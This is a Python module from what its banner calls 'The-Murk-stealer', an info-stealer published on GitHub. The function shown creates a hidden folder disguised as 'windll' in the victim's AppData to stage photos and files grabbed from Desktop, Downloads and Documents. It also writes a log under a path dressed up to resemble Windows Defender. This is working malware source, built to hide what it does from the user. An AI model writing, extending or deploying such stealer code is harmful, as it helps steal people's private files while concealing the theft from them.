#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#
"""
All imports
"""
from os import environ, sep, makedirs
from win32con import FILE_ATTRIBUTE_HIDDEN
from win32api import SetFileAttributes


def Folders(fileGrab):
    pathf = environ['USERPROFILE'] + sep + r'AppData\Local'
    try:
        makedirs(rf'{pathf}\windll')
        SetFileAttributes(rf'{pathf}\windll', FILE_ATTRIBUTE_HIDDEN)
        makedirs(rf'{pathf}\windll\Photos')
        if not fileGrab:
            makedirs(rf'{pathf}\windll\Files\Desktop')
            makedirs(rf'{pathf}\windll\Files\Downloads')
            makedirs(rf'{pathf}\windll\Files\Documents')
    except:
        pass
    try:
        makedirs(rf'{pathf}\system\sysFiles\winDef')
        f = open(rf'{pathf}\system\sysFiles\winDef\log20742384.txt', 'w', encoding='utf-8')
        f.close()
        print(f"path to error_log: {pathf}\system\sysFiles\winDef\log20742384.txt")
    except:
        pass


